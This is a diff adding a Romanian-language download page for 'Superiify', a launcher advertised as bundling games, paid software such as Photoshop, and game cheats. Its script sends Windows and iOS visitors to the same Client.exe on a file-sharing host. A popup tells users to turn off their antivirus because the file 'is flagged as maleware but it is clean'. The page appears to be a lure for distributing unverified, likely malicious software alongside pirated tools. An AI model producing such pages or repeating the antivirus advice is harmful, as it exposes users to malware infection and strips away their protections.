@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>Superiify.ro</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #eee;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      height: 100vh;
+      padding: 20px;
+      position: relative;
+    }
+
+    img {
+      width: 120px;
+      margin-bottom: 1.5rem;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin: 0.5rem;
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 2rem;
+      max-width: 600px;
+    }
+
+    .btn-download {
+      background-color: #1e88e5;
+      color: white;
+      text-decoration: none;
+      padding: 1rem 2rem;
+      border-radius: 5px;
+      font-size: 1.2rem;
+      transition: background-color 0.2s;
+      display: inline-block;
+      cursor: pointer;
+    }
+
+    .btn-download:hover:not(.disabled) {
+      background-color: #1565c0;
+    }
+
+    .btn-download.enabled {
+      background-color: #888;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    #terms-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: red;
+      color: white;
+      font-weight: bold;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 24px;
+      user-select: none;
+      z-index: 1000;
+    }
+
+    #terms-popup {
+      display: none;
+      position: fixed;
+      bottom: 70px;
+      right: 20px;
+      width: 300px;
+      max-height: 400px;
+      background: #222;
+      border: 2px solid red;
+      border-radius: 8px;
+      padding: 15px;
+      color: #eee;
+      font-size: 14px;
+      overflow-y: auto;
+      box-shadow: 0 0 10px red;
+      z-index: 1001;
+    }
+
+    #terms-popup h3 {
+      margin-top: 0;
+      margin-bottom: 10px;
+    }
+
+    #terms-popup button {
+      background: red;
+      border: none;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      float: right;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://s3-eu-west-1.amazonaws.com/tpd/logos/64a15c5e28632f8baaaa5072/0x0.png" alt="Logo" />
+  <h1>Superiify</h1>
+  <p>Descarcă aplicația Superiify usor. Instalare rapidă și sigură.</p>
+  <a id="downloadLink" href="#" class="btn-download">Download</a>
+
+  <!-- Buton termeni si conditii -->
+  <div id="terms-btn" title="Termeni și condiții">!</div>
+
+  <!-- Popup termeni si conditii -->
+  <div id="terms-popup">
+    <button id="close-terms">Închide</button>
+    <h3>Termeni și Condiții</h3>
+    <p>
+      <br><br>
+      Please turn your antivirus off, because the file is flagged as maleware but it is clean!  
+      <br><br>
+      Superify is a launcher that makes your life easier by combining games, software, and game cheats—all in one place, completely torrent-free.
+
+Superify Games offers a wide selection of games, while Superify Software lets you launch popular tools like Adobe Photoshop and Wallpaper Engine—all from the same launcher.
+
+Coming soon, Superify Cheats will provide game cheats to enhance your gameplay experience.
+
+Plus, Superify manages your downloads and library, allowing you to download and launch hassle-free—all in one place.
+    </p>
+  </div>
+
+  <script>
+    // Detectare OS (așa cum ai deja)
+    function detectOS() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+      if (/windows phone/i.test(userAgent)) {
+        return "Windows";
+      }
+      if (/android/i.test(userAgent)) {
+        return "Android";
+      }
+      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return "iOS";
+      }
+      if (/Win/i.test(userAgent)) {
+        return "Windows";
+      }
+      return "Unknown";
+    }
+
+    const os = detectOS();
+    const downloadLink = document.getElementById("downloadLink");
+
+    switch (os) {
+      case "Android":
+        downloadLink.href = "app-android.apk";
+        break;
+      case "Windows":
+        downloadLink.href = "https://www.upload.ee/download/18408406/55db4940ea5821124995/Client.exe";
+        break;
+      case "iOS":
+        downloadLink.href = "https://www.upload.ee/download/18408406/55db4940ea5821124995/Client.exe";
+        break;
+      default:
+        downloadLink.href = "#";
+        downloadLink.innerText = "Platformă neacceptată";
+        downloadLink.classList.add("disabled");
+        break;
+    }
+
+    // Elemente pentru termeni si conditii
+    const termsBtn = document.getElementById('terms-btn');
+    const termsPopup = document.getElementById('terms-popup');
+    const closeTermsBtn = document.getElementById('close-terms');
+
+    termsBtn.addEventListener('click', () => {
+      if (termsPopup.style.display === 'block') {
+        termsPopup.style.display = 'none';
+      } else {
+        termsPopup.style.display = 'block';
+      }
+    });
+
+    closeTermsBtn.addEventListener('click', () => {
+      termsPopup.style.display = 'none';
+    });
+  </script>
+</body>
+</html>
